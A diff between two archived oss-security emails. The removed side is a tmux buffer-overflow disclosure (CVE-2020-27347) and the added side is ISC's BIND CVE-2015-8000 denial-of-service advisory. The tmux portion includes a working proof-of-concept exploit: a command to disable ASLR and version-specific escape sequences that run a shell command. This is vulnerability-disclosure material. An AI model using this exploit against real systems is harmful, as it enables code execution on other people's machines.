@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2145" "Thursday" "5" "November" "2020" "16:03:12" "+0300" "snizovtsev@gmail.com" "snizovtsev@gmail.com" "<0bec66ec9fbf5d386845d6be2c0fbd96b5d82405.camel@gmail.com>" "71" "[oss-security] CVE-2020-27347: tmux buffer overflow in escape sequence parser" nil nil nil "11" "2020110513:03:12" "[oss-security] CVE-2020-27347: tmux buffer overflow in escape sequence parser" (number mark "U       snizovtsev@g Nov  5   71/2145  " thread-indent "\"[oss-security] CVE-2020-27347: tmux buffer overflow in escape sequence parser\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] CVE-2020-27347: tmux buffer overflow in escape sequence parser" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["4162" "Tuesday" "15" "December" "2015" "18:09:20" "-0500" "Michael McNally" "mcnally@isc.org" "<56709DA0.5000208@isc.org>" "109" "[oss-security] CVE-2015-8000: Responses with a malformed class attribute can trigger an assertion failure in db.c" "^Date:" nil nil "12" "2015121523:09:20" "[oss-security] CVE-2015-8000: Responses with a malformed class attribute can trigger an assertion failure in db.c" (number mark "        mcnally@isc. Dec 15  109/4162  " thread-indent "\"[oss-security] CVE-2015-8000: Responses with a malformed class attribute can trigger an assertion failure in db.c\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 31965 invoked by uid 550); 5 Nov 2020 14:04:05 -0000
+Received: (qmail 26567 invoked by uid 550); 15 Dec 2015 23:09:47 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,113 +11,126 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-Received: (qmail 1459 invoked from network); 5 Nov 2020 13:03:26 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20161025;
-        h=message-id:subject:from:to:date:user-agent:mime-version
-         :content-transfer-encoding;
-        bh=EMeCgJKboTZYiXLtl+DCjIAEd2CF4X1YBR70T4On2IA=;
-        b=LyWeKudHwMXJSwBeMstEKUdJ7UEvmF9guqYDiWfZob3vQaPJMEGJihr0Dc7d2qUKzm
-         YEA5mcNh/0/IB+MUWWnMoNdJGliIiLYqNufXw1HnoBsYfw2kwSlvv2zvHB1MPoYHkFxp
-         41i6vS5S3OEPC5IRrGcp9mzWHriVyDNVQVjJAanygYbRneaP1OVhwnkc3lkcSPZ3Ql7W
-         PjPLkX0oA7oCby+ioPtLMrYIOh+abfVkkg3cF+tynb3Y7SbykUqEf/zA9IZMopUPziEv
-         NLBOLgpBZ+xqegPUa4RKAHyJFzXAl3cf+VBtmc0bBQnmXu4aoME9JfxHulxrzEOOH41P
-         g5Ag==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:message-id:subject:from:to:date:user-agent
-         :mime-version:content-transfer-encoding;
-        bh=EMeCgJKboTZYiXLtl+DCjIAEd2CF4X1YBR70T4On2IA=;
-        b=MWXQq2tUgTUk1+U9ySmKHlmVbGwupBFt0lTishBXi9Pzd3NMLkXbCN3UGz9eJxspOR
-         oLOhGUeohmJxxVvgC8pOPqz5j8XPDcDzqlCM5JEAx3bvmfvJeOvku2CbSBufNOpF0OCi
-         t1fgni9rw3rHkw54PWKWyWnEAEGEeOUm6hlqJep7cKkn41dSByICk2mUCb6a/6mx18wH
-         /B9WzYXWe9gRUfycLIdlbyfA7ZNs4FSpZifRWwlNePERyD5JQFVj8YtnIBzwfauLGon1
-         IOwT2daA/cqeCB0pz+XMPuAhdvBh5V2sRDHuGR86flMtrbwc2hSvbB1uiD9Hv9ZbpYvI
-         Q7Gg==
-X-Gm-Message-State: AOAM532YSZp/7QDYDDoqTB/5f11UTFNLSFoUJC3tTvjKqU4k1DTpEROa
-	0ZiK4Vo5tsi3SZOt9NMbUs3EJbwOcmM=
-X-Google-Smtp-Source: ABdhPJwdSsZ0oG2eW570vjVkqejHHYtGHQ+B81TiwKqh8jTBBmxgReN/pBzVrOQzTdRyhUtajlEEGw==
-X-Received: by 2002:a2e:8851:: with SMTP id z17mr792755ljj.58.1604581394779;
-        Thu, 05 Nov 2020 05:03:14 -0800 (PST)
-Message-ID: <0bec66ec9fbf5d386845d6be2c0fbd96b5d82405.camel@gmail.com>
-From: snizovtsev@gmail.com
-To: oss-security@lists.openwall.com
-Date: Thu, 05 Nov 2020 16:03:12 +0300
-Content-Type: text/plain; charset="UTF-8"
-User-Agent: Evolution 3.36.5 
+Received: (qmail 26511 invoked from network); 15 Dec 2015 23:09:38 -0000
+Message-ID: <56709DA0.5000208@isc.org>
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0)
+ Gecko/20100101 Thunderbird/38.4.0
 MIME-Version: 1.0
+Content-Type: text/plain; charset=utf-8
 Content-Transfer-Encoding: 7bit
-Subject: [oss-security] CVE-2020-27347: tmux buffer overflow in escape sequence parser
+Date: Tue, 15 Dec 2015 18:09:20 -0500
+From: Michael McNally <mcnally@isc.org>
+Reply-To: oss-security@lists.openwall.com
+Subject: [oss-security] CVE-2015-8000: Responses with a malformed class attribute can trigger
+ an assertion failure in db.c
+To: oss-security@lists.openwall.com
 
-Hi,
+CVE:                CVE-2015-8000
+Document Version:   2.0
+Posting date:       15 December 2015
+Program Impacted:   BIND
+Versions affected:  9.0.x -> 9.9.8, 9.10.0 -> 9.10.3
+Severity:           Critical
+Exploitable:        Remotely
 
-I recently discovered a bug in tmux (terminal multiplexer) which could
-lead to crash or code execution. The bug was in
-`input_csi_dispatch_sgr_colon` function which is used by tmux server
-process.
+Description:
 
-The problem is that a bound check for a stack-allocated array `p` is
-bypassed if 8th chunk of input buffer is empty:
+   An error in the parsing of incoming responses allows some records
+   with an incorrect class to be accepted by BIND instead of
+   being rejected as malformed.  This can trigger a REQUIRE assertion
+   failure when those records are subsequently cached. Intentional
+   exploitation of this condition is possible and could be used as
+   a denial-of-service vector against servers performing recursive
+   queries.
 
-        while ((out = strsep(&ptr, ":")) != NULL) {
-                if (*out != '\0') {
-                        p[n++] = strtonum(out, 0, INT_MAX, &errstr);
-                        if (errstr != NULL || n == nitems(p)) {
-                                return;
-                        }
-                } else
-                        n++;
-        }
+Impact:
 
-Thus by using an escape sequence like "\033[::::::7::1:2:3::5:6:7:m" we
-can overwrite arbitrary 4-byte locations on the stack. Moreover, an
-empty arguments ("::") may be used to skip choosen offsets, and thereby
-keep stack canaries untouched.
+   An attacker who can cause a server to request a record with a
+   malformed class attribute can use this bug to trigger a REQUIRE
+   assertion in db.c, causing named to exit and denying service to
+   clients.  The risk to recursive servers is high. Authoritative
+   servers are at limited risk if they perform authentication when
+   making recursive queries to resolve addresses for servers listed
+   in NS RRSETs.
 
-Code execution is proved practical only if tmux address space isn't
-fully randomized. So ASLR with PIE will mitigiate this issue but more
-complex exploits may be theoretically created.
+CVSS Score:         7.1
 
-=== Affected versions / distributions ===
+CVSS Vector:        (AV:N/AC:M/Au:N/C:N/I:N/A:C)
 
-- tmux 2.9-3.1b
-- Ubuntu 20.04
-- Debian 11
-- Fedora 31+
-- Alpine 3.10+
-- openSUSE Leap 15.2
-- OpenBSD 6.5+
+For more information on the Common Vulnerability Scoring System and
+to obtain your specific environmental score please visit:
+https://nvd.nist.gov/cvss.cfm?calculator&version=2&vector=(AV:N/AC:M/Au:N/C:N/I:N/A:C)
 
-=== Exploitation (testing purposes only) ===
+Workarounds:        None.
+Active exploits:    No known active exploits.
 
-I haven't found any ways to leak addresses so ASLR must be disabled:
-sysctl -w kernel.randomize_va_space=0
+Solution:
 
-Then open tmux and feed it with the following sequence:
+   Upgrade to the patched release most closely related to your
+   current version of BIND. Public open-source branches can be
+   downloaded from http://www.isc.org/downloads.
 
-for tmux 3.0a-2ubuntu0.1 on Ubuntu 20.04.1 x86_64:
+     BIND 9 version 9.9.8-P2
+     BIND 9 version 9.10.3-P2
 
-echo -e
-'\033[::::::::::::::::::1431728064::::::::1431829797::::1431915746::m;t
-ouch /tmp/PWNED;\0';
- 
-for tmux-3.1-2.fc33.x86_64 on Fedora 33:
-echo -e
-'\033[::::::::::::::::::1431723856::::::::1432185743::::1431836040::m;t
-ouch /tmp/PWNED;\0';
+   BIND 9 Supported Preview edition is a feature preview version
+   of BIND provided exclusively to ISC Support customers.
 
-If done, `/tmp/PWNED` would indicate that the attack succeed.
+     BIND 9 version 9.9.8-S3
 
-=== Timeline ===
-* 29 Oct 2020 - Vulnerability reported to author, security ()
-openbsd.org, RedHat, SUSE and Canonical.
-* 29 Oct 2020 - OpenBSD Errata published.
-* 29 Oct 2020 - Fixed in OpenBSD and tmux 3.1c.
-* 30 Oct 2020 - CVE-2020-27347 assigned.
-* 05 Nov 2020 - Vulnerability opened.
+Document Revision History:
 
---
-Regards,
-Sergey Nizovtsev.
+   1.0  Advance Notification, 24 November, 2015
+   1.1  Software releases 9.9.8-P1 and 9.10.3-P1 replaced with
+        9.9.8-P2 and 9.10.3-P2 to address CVE-2015-8461, advisory
+        text and schedule updated, 8 December 2015
+   2.0  Public Disclosure, 15 December 2015
+
+Related Documents:
+
+   See our BIND9 Security Vulnerability Matrix at
+   https://kb.isc.org/article/AA-00913 for a complete listing of
+   Security Vulnerabilities and versions affected.
+
+Do you still have questions?
+
+Questions regarding this advisory should go to security-officer@isc.org.
+To report a new issue, please encrypt your message using
+security-officer@isc.org's PGP key which can be found here:
+https://www.isc.org/downloads/software-support-policy/openpgp-key/.  If
+you are unable to use encrypted email, you may also report new
+issues at: https://www.isc.org/community/report-bug/.
+
+Note:
+
+   ISC patches only currently supported versions. When possible we
+   indicate EOL versions affected.  (For current information on
+   which versions are actively supported, please see
+   http://www.isc.org/downloads/).
+
+ISC Security Vulnerability Disclosure Policy:
+
+   Details of our current security advisory policy and practice can
+   be found here: https://kb.isc.org/article/AA-00861
+
+This Knowledge Base article https://kb.isc.org/article/AA-01317 is
+the complete and official security advisory document.
+
+Legal Disclaimer:
+
+   Internet Systems Consortium (ISC) is providing this notice on
+   an "AS IS" basis. No warranty or guarantee of any kind is expressed
+   in this notice and none should be implied. ISC expressly excludes
+   and disclaims any warranties regarding this notice or materials
+   referred to in this notice, including, without limitation, any
+   implied warranty of merchantability, fitness for a particular
+   purpose, absence of hidden defects, or of non-infringement. Your
+   use or reliance on this notice or materials referred to in this
+   notice is at your own risk. ISC may change this notice at any
+   time.  A stand-alone copy or paraphrase of the text of this
+   document that omits the document URL is an uncontrolled copy.
+   Uncontrolled copies may lack important information, be out of
+   date, or contain factual errors.
+
+(c) 2001-2015 Internet Systems Consortium
 
